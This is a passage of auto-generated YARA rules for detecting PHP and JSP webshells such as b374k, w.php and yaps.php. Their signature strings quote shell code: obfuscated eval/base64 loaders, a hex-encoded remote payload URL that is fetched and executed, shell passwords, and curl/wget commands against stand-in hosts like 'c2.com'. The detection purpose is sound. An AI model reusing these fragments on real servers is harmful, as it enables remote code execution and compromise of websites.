      $s11 = "RgzGS94JwUvLDATbgcuE3IrH0gGY3ULFS5rEBUTLwgiUSAOGhorOxspPyAtIAF8YgU7IRRCRx4gBwEGDk4hAwUwKxNEFCEgBwUCcyhuBiIEMVMyLTECAjZRPw0aEgETY" ascii
      $s12 = "icCPV4QFgQ3AjZvBT5wNxcFWhA9BCs3A14QJTQ3AjRoEx4DIgI1XxAbAwHAgCZqPhYJKwIeXhAVAwE0NmgQFjgBAicGEBB6AQEmShAbJQELNmgcFsCANwJCaBASCgEPM" ascii
      $s13 = "pJVhAcBX1qaAAhcX6f/pl9aFQej/5y7AAJaX7cAbbYAN19XX6oAAP///x4AAAAAAAAAAP///1i4AGG2AD46CBkIKhAUMrYAyzoJGQgqEBsytgDLOgoZCCoIMrYAyzoLG" ascii
      $s14 = "zswJjRGPyEnMjcSWwEABmNoYXJBdAwAGACeAQAGc2V0SW50AQAEKEkpVgEAECgpTGphdmEvbmV0L1VSSTsBAAJbQgwAoQBZBwA1BwCvAQARZ2V0RGVjbGFyZWRNZXRob" ascii
      $s15 = "wAZBwAtAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAE2phdmEvdXRpbC9BcnJheUxpc3QBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAC" ascii
      $s16 = "AI6awlmDyEERWsLGDoVBhhOEBoOAjJFaBoCejBsWHAUMBAaFxVwEDsGGQYyawRvAyo2MmgQEjEHLxxLCBsbATXAgGY/FgEjGTV/aTMqAQ41cWAaIwdxNXMeLxcFLBBoH" ascii
      $s17 = "zoTGQgqAzK2AMs6FBkTKhAJMgO9AN62ABQZEwO9ANe2AGg6FRkUKhAMMgS9AN5ZAxICU7YAFBkVBL0A11kDGRFTtgBowAAFwAAFOhKnADg6ExkIKhAoMrYAyzoUGRQqE" ascii
      $s18 = "BZnZXREZWNsYXJlZENvbnN0cnVjdG9yDAAqAH8BABYoTGphdmEvbGFuZy9PYmplY3Q7SSlWAQAdKiIBSH87Iy4kWWo9NjEzDxhINTIwBywsFk00JTEBABNqYXZhL2xhb" ascii
      $s19 = "2QKAN4AYwEAAygpWgEABShbQylWDADNAJkBABBqYXZhL2xhbmcvU3lzdGVtAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwoA1wBICgBOAL4BACcoW0xqYXZhL2xhbmcvT" ascii
      $s20 = "mcvRXhjZXB0aW9uAQAGPGluaXQ+CgArAJABAAMoKUkBAAxqYXZhL25ldC9VUkwBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sY" ascii
   condition:
      uint16(0) == 0x7453 and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule Safe_mode_breaker {
   meta:
      description = "webshell - file Safe mode breaker.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cafa5bbacac3000c0959f8ee29c81a7c0da9a1b9b68d5d7ab1764630d0b6aae5"
   strings:
      $s1 = "  if($_POST['root']) $root = $_POST['root']; " fullword ascii
      $s2 = "  echo \"<div style='float: left'>Root directory: <input type=text name=root value='{$_POST['root']}'></div>\"; " fullword ascii
      $s3 = "  error_reporting(E_WARNING); " fullword ascii
      $s4 = "  echo \"<head><title>\".getcwd().\"</title></head>\"; " fullword ascii
      $s5 = "  echo \"<form method=POST>\"; " fullword ascii
      $s6 = "  if (!ini_get('safe_mode')) die(\"Safe-mode is OFF.\"); " fullword ascii
      $s7 = "  ini_set(\"display_errors\", 1); " fullword ascii
      $s8 = "  set_error_handler(\"eh\"); " fullword ascii
      $s9 = "  $path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL).\"{$chars[$i]}\"; " fullword ascii
      $s10 = "  $root = \"/\"; " fullword ascii
      $s11 = "  echo \"<input type=submit value='--&raquo;'></form>\"; " fullword ascii
      $s12 = "  // data: 28.01.2006 " fullword ascii
      $s13 = "  for($i=0; $i < strlen($chars); $i++){ " fullword ascii
      $s14 = "  echo \"<HR>\"; " fullword ascii
      $s15 = "  echo \"<xmp>\"; " fullword ascii
      $s16 = "  function eh($errno, $errstr, $errfile, $errline){ " fullword ascii
      $s17 = "  glob($path.\"*\"); " fullword ascii
      $s18 = "  $prevD = $D[count($D)-1]; " fullword ascii
      $s19 = "  // break fucking safe-mode ! " fullword ascii
      $s20 = "  // Safe mode breaker. eXpl0id by KPbIC [myiworm@mail.ru] " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule webshell_jsp_asd {
   meta:
      description = "webshell - file asd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b06e71df669a1904edcf91a35d339812cd1723cfc701d4afc268f2221bd400be"
   strings:
      $s1 = "<meta http-equiv=\"description\" content=\"" fullword ascii
      $s2 = "<meta http-equiv=\"keywords\" content=\"" fullword ascii
      $s3 = "<form action='?act=up'  method='post'>" fullword ascii
      $s4 = "<jsp:directive.page import=\"java.io.FileOutputStream\"/>" fullword ascii
      $s5 = "<jsp:directive.page import=\"java.io.OutputStream\"/>" fullword ascii
      $s6 = "<jsp:directive.page import=\"java.io.File\"/>" fullword ascii
      $s7 = "  </head>" fullword ascii
      $s8 = "  <head> " fullword ascii
      $s9 = "  <input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url\"><br>" fullword ascii
      $s10 = "      o.write(text.getBytes());" fullword ascii
      $s11 = "   String method=request.getParameter(\"act\");" fullword ascii
      $s12 = "    String text=request.getParameter(\"text\");" fullword ascii
      $s13 = "1</textarea><br>" fullword ascii
      $s14 = "  <input type=\"submit\" value=\"up\" name=\"text\"/>" fullword ascii
      $s15 = "  <textarea rows=\"20\" cols=\"80\" name=\"text\">" fullword ascii
      $s16 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword ascii
      $s17 = "    String url=request.getParameter(\"url\");" fullword ascii
      $s18 = "</html> " fullword ascii
      $s19 = "  </body>" fullword ascii
      $s20 = "  <body>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      8 of them
}

rule webshell_php_w {
   meta:
      description = "webshell - file w.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b1a8648bb5ce9e1dc3ffb614f47687434cd424793e949e78c6ebf85e9e58393"
   strings:
      $s1 = "  $_SESSION['api1234']=file_get_contents(sprintf('%s?%s',pack(\"H*\",'687474703A2F2F3132332E3132352E3131342E38322F6A78666275636B" ascii
      $s2 = "  $_SESSION['api1234']=file_get_contents(sprintf('%s?%s',pack(\"H*\",'687474703A2F2F3132332E3132352E3131342E38322F6A78666275636B" ascii
      $s3 = "687474703A2F2F3132332E3132352E3131342E38322F6A78666275636B657432303134312F6861636B2F312E6A7067" ascii /* hex encoded string 'http://123.125.114.82/jxfbucket20141/hack/1.jpg' */
      $s4 = "if(stripos($_SERVER['HTTP_USER_AGENT'],'baidu')+0==0) exit; " fullword ascii
      $s5 = "($b4dboy = gzuncompress($_SESSION['api1234'])) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); " fullword ascii
      $s6 = "header(\"Content-type:text/html;charset=gbk\"); " fullword ascii
      $s7 = "$password = \"d69tjj0sb2dlbq9\"; " fullword ascii
      $s8 = "error_reporting(0); " fullword ascii
      $s9 = "if(stripos($_SERVER['HTTP_USER_AGENT'],'myccs')+0==0) exit;   " fullword ascii
      $s10 = "session_start(); " fullword ascii
      $s11 = "if(empty($_SESSION['api1234'])) " fullword ascii
      $s12 = "7432303134312F6861636B2F312E6A7067'),uniqid())); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule b374k_2_7 {
   meta:
      description = "webshell - file b374k-2.7.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d33993b55ed2b9de8790c228344c40d5cc824d8951e342fae0d47d823ac67801"
   strings:
      $x1 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=@$s_func('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'" ascii
      $s2 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s3 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s4 = "8isPyj25+xDKv3ZT4dBXB8+fO38ur+/1sWDN++pg8VLr0yxLwX+rzTTpLsu6t4NHx/ffDGWfzW0BpT7rw1iQXKwdjHn1Z5nrNt3BzTfrJa4iuAnPD3dHTnr7uw/KuXoK" ascii
      $s5 = "OONmlKdTO1cq1jr9QZLt72rtYBa5jarg24Na0+mDG80DsJ0zzLLYUveL8Z6h8NlTCrjC+zYlZwOV6itq/PGetOsMkVSIzQRH3bqqyJ+UHqDTqfuLWoNvi6QLW9R5fP0o" ascii
      $s6 = "ZM9he5REwHoT6VSh8iJNCYaBVfr5bsKtt7OKwcuR/bH9GqzEpgjpVeGOQPDxCJ15AyRPZL9pVJwc7s244hjVcjZdep0cMc1u14tq9VCt5xrqyWtoBpssWbNlBa1GRd2f" ascii
      $s7 = "rUpzJbL4oLoSKXc4FDLLZyWeMDyBCIjlQVvDJRxpTler9esQfPWaKH0GblBHBvGfrFViGLNxEmBqGlGg2Usb7HpN2bHBjvDiKmJFY+zyazTzdXkDqnMtLkqKyUZ4/BKr" ascii
      $s8 = "REo0ZLRJxcLXDtGPKdtUFDlEC8U3QtKlbPC07lrAdWvIt0LUxazglSZa0Hk+fMAPC5khSay1oIFfJDE/FyTgIbexZCq6nU7jxlOgPC6LPMU5EbiuWAvZhjFBR+lcwPHz" ascii
      $s9 = "LvmeKD1T+jKNk28vdsjVGFJztGNXZ2tZo3dmh/YnD0+bi1rUPWWA9GqUdXqqtARGmP4tF9ygaqUU/G+LmpCpVqe5Kia2keLRYFTK41DY6LOG85oq5/YouYOaMed2BSG1" ascii
      $s10 = "RfogR+XZhtdLldb5b1XqRI2ULn52l5B2fGWyvWRXKWxr9qCJzQBSWftarU24jS9VsV7w6bNS3R5jzbbNdZUXbejA7V3Sqxduzce0vO9O8SdvsztmdPq5GKDXJsz8hYxU" ascii
      $s11 = "E7ceDMZJKdjk8A3pEkpKkxJSEyhp0D/iSl8m+ppQVSSm08tYUgK339ZcIrCBjb26DlkeD0/LhHeYL8Rh+XrY8q8FbclvI55EbQFou33JsTdR0YwdcdIlhXA8AZl/axk2" ascii
      $s12 = "XGsh0CTCH9ETirCn8GlkuDHb7pjQ9CfMiHW/1QpSfvSsBQDxMPR98lqUqzkWIGadCMpcX6RUKLCrv4TTmFAqcuN88a+EBfO2Oxvb+aL+d/ObOOfOESsbAOJ0ILk/WQCr" ascii
      $s13 = "q0uJja9ms0lalnarif5ecMbzUy0qyCePdMOpLCU992dtBiLHUPYzVvGkOjQwwlLNfFxXyuNx9hKbQ9P4qpabOkzhWxX6useVp6I9KF0IqSq2asPy7l2aakiw3GlVW+26" ascii
      $s14 = "R9NOisBsfesIAlka0U0RG5fELRutb7azZv6pOEyeLmq1oTSCiAlzbZFm2o75SLl5UDne+O9sJ0PjMYGmRapHlHbW81p28EYSWjl8C4yUJQJ7th7bDNu64S1ae3HqwVZq" ascii
      $s15 = "B3OGuC5kv/2KPUWNobxFENIrCC33rvaqhG8NL7yIBZCCx8Chk+T/dKPcTMRhUTJSr18DagEcEy8vA+XzRggvAr5GL/EDz19BZ17SBYMXytHjSSz0maDuFE4PW62Fj/nT" ascii
      $s16 = "+NYDxYMXcew10+6EtQGCQGpYZ13TrpLNgVV0yhCrxcXud+M6x+J49W4bPysLZLoXntjA4+rAh8zF89s4p8c/JVeQONqkfknmH/+getT5jr7LLmERbLfx3fnM78l0n3fI" ascii
      $s17 = "eFyDRfwsG9TDswcC3StZ3MmBcSx6N8Pqdz4WCzODiHCXqcQDoAH+Pr2v7jJNzE+mwrj2Lrnc+zgyAT8MA3dOidAeSKXjwVFsD2CNH9jhFugZktaEPA2k9peYENPT09w9" ascii
      $s18 = "LRIhAo+Lgu6yV5K+ePsY9ckhhhoq8R3i8X3K/4+PMNmsB1VbzzeYeRUlR6A61Fh/ETTS1TfPmOkZaOI45XE8UuiE2XMiJY4S4tToJ8CGvKl6HAs2p31WR3GKD6yjJ6oh" ascii
      $s19 = "GEVPsCGEa2D2NPn6NZhgGjw1WpFaShaqcRBowO3Sa/Gar6MKf3pKmp1EuOkPhR6lQqaiJ1SX2pCYfIVY702Iv5+lc38/nsmTPC3oTfH6Ks4M+BFwI3BKTCY7qGLMuucZ" ascii
      $s20 = "Yrlj6SRk7TcVMPtht7ZOjq/Idl2Yw7UvvV4g9t4uTLb2pXjoE249WVHKay4bWG25O1Bzm0VVJbc6HqT5Yddc3Cget1hjS5hXGWpWzVuSAv5dUHiqig7asuzlTp2losti" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_6 {
   meta:
      description = "webshell - file b374k-2.6.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9139efbd93b0102bba961899642fa26d3dc8e366919f71cd4e748fce2a367ff6"
   strings:
      $x1 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=@$s_func('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'" ascii
      $s2 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s3 = "$s_pass = \"0de664ecd2be02cdd54234a0d1229b43\"; // shell password, fill with password in md5 format to protect shell, default : " ascii
      $s4 = "jhLbfjhWEtPYzG6uC9UM2Sr0O1MxvPutnXYKc2NLhbinbY+m/dlLl+qSkZ+xFMHolPcJFfxVSJjlagkm9nuC7Vpt1AqNNNSecrRU6lLCBrJdwCVUna+iWnNpJ1b2e3Mb" ascii
      $s5 = "1J1NG3NhCxQQ+nacD8zis0lqcSynJphRbXB6USZnHeH1JoDdi47Ks3A2n9aWpDpnllNLDqxWH0/zjezApGyimKFSDNzsFypx0tSpy8k+GFy0LJXm56+3PUa4n5lTYvx0" ascii
      $s6 = "QyzrT63bW/3aa6QbtfFjaFmc4Myv+4ktsPyJi7UY7XGZGPX2bjcrAmbqtxN7ir1tn3sCJttag50vtyMHYdHqTjejhIK268nyqOYqllZYxaXidaI6g5zh3LGrnCsUarVw" ascii
      $s7 = "wfLB7cP8e+v2JY/QfTpyv1ab4Fyc8hYtOx1xBhvnCLB8Si8efi4mE7HT4BXNIjwmzwzMqtXhpXI3nnkfDe5e/ugCpNC1b89qBCISxLD4xzH4nSa8ivGXJgF1HIv58POa" ascii
      $s8 = "p9LTjpjxeJjseJ4nbZiXPNYS/VaqaS26h9ytcVhOl2u8oBkiRTVaSfXqLU2OX6n22OW7dlEa1lRikebnoPpLj6jzDSz62T2gyUYm8dlljdlKlbk9pyy6WQm8T3fTY8W2" ascii
      $s9 = "mwwzk+48pDLmdvlolDL0YS1ZzJrJq8UYocNdVj0B/PdllWKlZ5RSBdJPV60qo1Fb9YqKemhvZ7tlod5gy7E4tV4W6ekFlWsK1OzvUvtuHyeYcxOjsrVSnI13ex1mAGr2" ascii
      $s10 = "sKACdrK8UjGDfsePgK9Nn7Cd7VCihpvxpyqDpyKlYd74Ba83qWwfj2j6B+QdP/wIfr6EwpUNlS/LHp74Rz9IT5+vnHhCfPo+S/Gv95FTPTg0fGYH3kXxRVHh4YfVQ0f0" ascii
      $s11 = "NOVrVzpr9Kjo9qdNYZ6UuHYUjVdms50JrGsNJI2I8+zxwyYJwijtVmBwntg4S7pZZ1Iywo7WpIxW9W1yaJdYtW02t3oVElaatl9vNXp5xcssIZqe1OzhmSh1xs2hfZwt" ascii
      $s12 = "X4zmScHx/Vg1WTKxMReCUYqAearAlHXmfiELtTXbHmn96v8YGYM05X0akeNjtxkaaU0OV4a7zN5TbCJKVHt1/jFLsMs50PCIElWIfjmcL8tZvYcuU4TA99q2KEzhWh2K" ascii
      $s13 = "R6frhHFPEfX5rFR1yrH12q6LoqL9ZzvDNjxIKuqsXwdGBipMnfMsGoxPW/J/Up82K2a+7I4TbWY9jRmHrJzrinHUoXlio7NadbkxmS13GIP3EGR6XFXbOqKKiTa0iw9y" ascii
      $s14 = "iCoZn960IXBHqjFeiddnmv5hbiaWQJ31OI7etzpJcjE4kDPGSu/2dWaw0GHlnKSktoU2YSirPvNNAsWUD1qv193GSU1LrTGvTZ57C56yqaWLJUser3aklpqJo5bo5HK0" ascii
      $s15 = "V+sycGwYUhczywrFWVuWfV4mZ/yI9kejbWZopdztNAztElv1t1lpo3sGnR6r2hvMpVNuz3uTjLaylD66XKiPjVXirFecMdaw5AL+faqJaiGXJs3ZV2gS71yvGKV44NuN" ascii
      $s16 = "k48OUG4m54+z3kL1Pf0zsoJsO/y56YaoiUVItMpZn0frf8jGnn0aDi3rL5ZT0HU/6ep/hpNFVAw/lLqB6ga58gX6wp3ON5UNz/5FXWcLNGaZWnK3Rl/wBJNpLBvpX+Vh" ascii
      $s17 = "iBjzvQCoM8nGI95JJTocgGCc8SWMc13fqJ/oCZKMrzH5h6nuUr+p48yRXMy3JG7yEkAKwKEu6rowy0fDT6c8uv3/zlql5VPbrtE/cMv9JxZfsT7hQ/+FvETVnof0YbiT" ascii
      $s18 = "nRJ6HHOVUkFU655ZbTgrNsjBmH/MYPGqcIFYcfTXWjkvK1WV3B9o55DbPwFHa6LevSUVejpOPortptRI375a1Xiv16kzkv+/l+6daN0MNsz2b1GC1mLFrIWTc/OMD8+x" ascii
      $s19 = "HHWTjPWBKoSD9rDx2pubInFf/tlbNMgZI2hZCfbAzyhborw/yzcreMlwa+HZeksARPx5yXElA4jFpHnUGAlgGrv5Dv/hgm7mRew62shwMNV8gEs5JugToG2lEHsdruLt" ascii
      $s20 = "wxTbyYHPFHOd0tJiuK2HZueDMrbKp+URuNmYjwZJ9KJdFM60nKBrxx786K4idFZJkOKfTJB92d5Lk0JVN3KZnfJdJtbV+2aIdODxUanp4vDZCWr3elwmdsmmUZyoa42p" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_yaps {
   meta:
      description = "webshell - file yaps.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2fb7e5a2706d99e11b402fdc3970c4ad4e7b863e0f970471c3b3242973d5fc8b"
   strings:
      $x1 = "//curl -d \"0=cGhwaW5mbygpOw==\" website.com/infected_file.php  (encoded phpinfo())" fullword ascii
      $x2 = "your@machine:~$ curl -X POST -d \"x=192.168.73.59\" hacked.com/uploads/yaps.php" fullword ascii
      $x3 = "E.g: $ curl -X POST -d \"x=192.168.73.59:7359\" hacked.com/uploads/yaps.php" fullword ascii
      $x4 = "//curl -d \"0=c2.com/file_to_be_executed.txt\" website.com/infected_file.php" fullword ascii
      $s5 = "infected@host:~$ php yaps.php -s 192.168.73.59 4444" fullword ascii
      $s6 = "\"suggester\" => \"https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\"," fullword ascii
      $s7 = "//curl -d \"0=c2.com/file_to_upload&1=extension\" website.com/infected_file.php" fullword ascii
      $s8 = "Download Linux Exploit Suggester to /tmp and get it ready to run" fullword ascii
      $s9 = "fwrite($s, green(\"[+]\").\" Permissions changed! \\n[i] You can run it with \".yellow(\"sh /tmp/\".$downloadLinpeas.\" | tee /t" ascii
      $s10 = "fwrite($s, green(\"[+]\").\" Permissions changed! \\n[i] You can run it with \".yellow(\"sh /tmp/\".$downloadLinenum.\" | tee /t" ascii
      $s11 = "fwrite($s, green(\"[+]\").\" Permissions changed! \\n[i] You can run it with \".yellow(\"sh /tmp/\".$download.\" | tee /tmp/LES." ascii
      $s12 = "fwrite($s, green(\"[+]\").\" Permissions changed! \\n[i] You can run it with \".yellow(\"sh /tmp/\".$download.\" | tee /tmp/LES." ascii
      $s13 = "//curl -d \"0=phpinfo();\" website.com/infected_file.php" fullword ascii
      $s14 = "function stabilize($post_socket=\"\"){ // spawn an interactive shell" fullword ascii
      $s15 = "//curl -d \"0=whoami\" website.com/infected_file.php" fullword ascii
      $s16 = "$curl_url = $_SERVER[\"REQUEST_SCHEME\"].\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"REQUEST_URI\"]; // htt(p|ps) :// website.com" ascii
      $s17 = "$curl_url = $_SERVER[\"REQUEST_SCHEME\"].\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"REQUEST_URI\"]; // htt(p|ps) :// website.com" ascii
      $s18 = "shell_exec(\"echo \".$final_payload.\"| base64 -d | php -r '\\$stdin=file(\\\"php://stdin\\\");eval(\\$stdin[0]);'\");" fullword ascii
      $s19 = "Download Linpeas and Linenum to /tmp and get it ready to run" fullword ascii
      $s20 = "$cmd = \"wget -qO- --post-data=\\\"\".http_build_query($socket).\"\\\" $curl_url > /dev/null\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_4_poly {
   meta:
      description = "webshell - file b374k-2.4.poly.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9e4ab7faa64e1ceb4c21994f59597bf3e310bb5fe4b41bf1e3de5a41396389c3"
   strings:
      $x1 = "$b374k=@create_function('$x','ev'.'al'.'(gz'.'inf'.'late'.'(bas'.'e64'.'_de'.'co'.'de($x)));');@$b374k(\"HJ3HjuvccoVf5cLwwAYHzAm" ascii
      $s2 = "LL8sbDWMZGbDodfmt5FENab2/MuOp0Cvyy/iRCv27dK27nazL5bKZ+Eoj1sxII/iDAVwtzFDJAH/sUYGxDM3dhdseLz1wweJ1K5UCGuAZGElIwYMgfLWM5a8z0Jz3lvL" ascii
      $s3 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s4 = "T6f8irun/Mpd/tw6gehSuwXyNPAa2EaDkOBgPUzie9Z9Bmw0YPbCRCS5CpmQmX5HQ0ds5ES/lmDllh0VXQ9wyF4AbzXzF6zDHR4/NOsdTvDIRrHvmZXLCzYCeT/ATMn9" ascii
      $s5 = "Cu9NrrDDTKme5ZeCxipqnpTJ7k8NowxqTCDYoEPLQ3qIXGScJTQ0K08SM9TZxLOfwdD1L51z5aeKiNTDaN9r6Uj6eXC96UGq1zUomFogetFwrVJWhiNFDZJQvoXQdm3c" ascii
      $s6 = "41xIKyz1kRf6qDn1tb6A8K9xe8+530TZUX4rnKmli68MsZJcYzVJWafNGhzfoTswUd7CnxGd5DuEYhGJMvHluuSRmeW3yU2y1XrIftpv84hZ3c/etADIF392s30lNXgR" ascii
      $s7 = "W33bSgQyOLwji/djF7k3ybC8tJ8Xifq8NoI1EOzMyzRlp+/b2+aLbIQZRC3mZ0a4QoJC4FHKiPyq8lZVlzvoEWMn42+3s47YfiuJpZMgL4EpUl8tTkvEyezNEOFiy98a" ascii
      $s8 = "epPjtejHTmUx0V9QDdE0nAtNkjlx/YU2fObe0y8Dwui9BnDJF8XUj9LZuBCEQ2AHaDllYJvFN7ILyO1BSQMMnIc+heTbfSM3v4Evk9krdsz8IcpYGCcZKC7Mu8jioXFe" ascii
      $s9 = "Jw2Jhaz0QYVlJbDYGsYuYzqxFvUUhB1wEx5nai7H+h65/EYAMPsUn787lpVHPANgOq71qSiGetP6Z5o2rtNhWT9g7CNd2XcKlAw5uPOEkNttUqJPYpTifpftqe9/W8Dh" ascii
      $s10 = "rTTV5jspY6jTFj22KH9/GVL4oNd1Q8ulNwyajhjn3pZPH0S6MMvDK/g9A8n0c3gZjDkZ21ZwRG1w4aU32ZhnRUXN7Ol5EBqxsVnGupNScYSXGh9Ll7MsgrlP1gzNaEjo" ascii
      $s11 = "45GuB6oEH2w+yhg/6vA8SvmYPIo+NrYJwRK2aa6ZzfwBTdKgqYUAwx6cSpYkQbo4C+p6C0jSRAXsAJxSfmCCG1BuIQlqxF7cJV5gYL/9hhAkyky4B8h725k6sqG8brIM" ascii
      $s12 = "WBicqQiqnpV/fZ3JqqxIEIZfpbn04h5sKOeBy104llrlXA7ppnGetRxLffr20Ive9SI3AZEZBMEfX0BC8KSj961/Et/cwocXpKPAQOHDn1W4PzcqTHbJ0G26NlTRPCgw" ascii
      $s13 = "xqD4vcDuDS0MSxvFjx+izySKGS2M5kj/totSJ3HoUvaW4Ebaor+CtCU/4nNMs21/Y840endXl+VxejzAFmDYco6nz0WLcwbynuu1ZtTEKchCu0WZAl9nHMiMvmQY0Df8" ascii
      $s14 = "Ki3uJG6TSIYJjwLZpOLZrMf1x9hqzSC1UJ+FvKl2gjd8261Y/g201nMunZKjcOml87PfU6/AwI8anEZk4T4vzropneuxqTLtzNBL2OF1nF6ImiakEQhAJsRL+i22RRmd" ascii
      $s15 = "WO1ErDxrecJnFZurBZiYIlVPj+sg2Wkg3oY9NfDAWf1Gh7Bw5PItCzFfEMGScgzhzFlhxtKOvnM8Es+vyrRnK4oWUmeO922SJaTEzeRZMNuqNoNvHpmqdLI+sWipJtMp" ascii
      $s16 = "6I4iHT/kx8v4kjwl9iBW6wNBNGhyElqkKEYPuPr8uCjpQOJtgAnOrog1r7DcGVEDu5bZTECp27vJ0ODRqY8BUaHDVafMIes7JLK/OBTz7rBcCp24RvyjjLBqk2clL2Cw" ascii
      $s17 = "CCtvjn0UBXcppLJt6c5s/IFzSkULIUY2pMOFTQUXJRHHWAHECvjvocomlMm8KljiM3NMd3BfkW/OVBLaNCNV69ytREVwCB7YqjL4eFpmwIYV3FCyuHW1OHaehuvD6FDb" ascii
      $s18 = "ARh16Fdoiv6BvUBXNTs2mX3bJXPME72NLII97/ULZHliLIuj2tKmURmiVIGXotKDm7gr1JcOM1nbmUZIaOEvk9JGkrOI1pmEbUoCKzcowzFJZyx3FgxDTa8LT6x95+2F" ascii
      $s19 = "tS1qgg5twu4DHIrDHWNRrfj4w7I49Qrw+BoLWfgzDqLSPKTHn2qBvdOzEBWkCmdob9oSqXnUXt1uBAT/VEHVouGlLHor1UZMrsLj/1It3pOTzhjHDEcXso3Mt6kPgLs2" ascii
      $s20 = "bjEkCJuI+slrBK1AH6Tfr91cXLpHv3XKtJuvUiCwcohgEQrM1VQpORTfg/W+N/STBz6hwum6xbNq4zgM7dFqOualaXPmPkPNfPjTE9tWVVh36UfxBZUEdXl/xSdvj2kI" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_4_min {
   meta:
      description = "webshell - file b374k-2.4.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7b42ce8cb31e8104ad06c52c318b659e5a11182838194e70b9d9afebb3722306"
   strings:
      $x1 = "$b374k=@create_function('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'.'( bas'.'e64'.'_de'.'co'.'de($x)));');@" ascii
      $s2 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s3 = "6ppnLeXeCvv3J4fek/1qQ7wHyfX/AJOq8E56zcjra+UrQ7NvTqhDe7zuK+PqsKnia6YsX5dE1seEwyYF4vaeZU/CKvqvVj37aa7f8dW9S5XajWyHTdIkNPGsSDoWE825" ascii
      $s4 = "K6SC30eCeXXbCzuZXhteBy+UUcGF9lpHb54b+OP126+DGKE5mQxEwLYwi5vGIrCEKT+Ai94mhqAQ4KqgfKcGrKajl8xf9ORRGJRyJxGPHS72MNRIKl3UlrqnLfxqzT6C" ascii
      $s5 = "XbxED1cY2ZJZjNJYLQZmczAOoh+iv0ftPUaA8vGZwQNd8oAhlRj5snp4/OKG6f9g8RKNelT9eVPmfq1r0C6fo1uHOrRuQq8hRLJB2tKMxlCVp6ieopm4ulhMHyl4IMID" ascii
      $s6 = "KcjVAwhFDURJIcIKb9n/8EfUvkMGMDw4KKupeCIrcGfCW6V20FH2IrqL3+GoQqmn4ch5Oe4x+AvjQthiKbwQ8d3jBKJyLzt67wno9+G+gWOz590gUxzE4JUcjv0CG7yN" ascii
      $s7 = "0XU4e7MaxpC4HvVJ/3dbtWaPfzLQsZbuvaou9k8huOxmi0p9ktGR9mVwzU2GzqhGLgVqslogtybSUUb494JyOs89ypWynIW4NNV8YVvlNN+mMqtuE0IjXm9Ot3WATcqs" ascii
      $s8 = "gAqfhekR2+xPypVStjtB9KhSc6hRf9+QH4OAEyJjBKALoA173Rx8Cw6B/4cGy073wqwMBxoP6qI/1bDDwQD4HrLMPGAq74IVUODe8bvJDoORr9iSI/87/8fQERpz736D" ascii
      $s9 = "b/dpTARj4Af+LHwXwntiFIcCxB/8US+b0fcwLCI5/nIcC5ylHYuADGSgIeAUtH/mzAiBKS2Io2a2+IrGszAXvPZyFAr+YE4CxJPpogr6MlDU8JXhnCMfX3i0JiPA8xNh" ascii
      $s10 = "V/XpeQ43mCSHUkJ4cruneu9GHZBzSizP0X8e9p1IuZl/DXKTnPeBNfJ5euvh8NXXxnfefN/GdlNvFGNB2F+eVHhjAivPpq4fBJPPlVDjq+nLB0QDhobW9Nx4E2fGGhVA" ascii
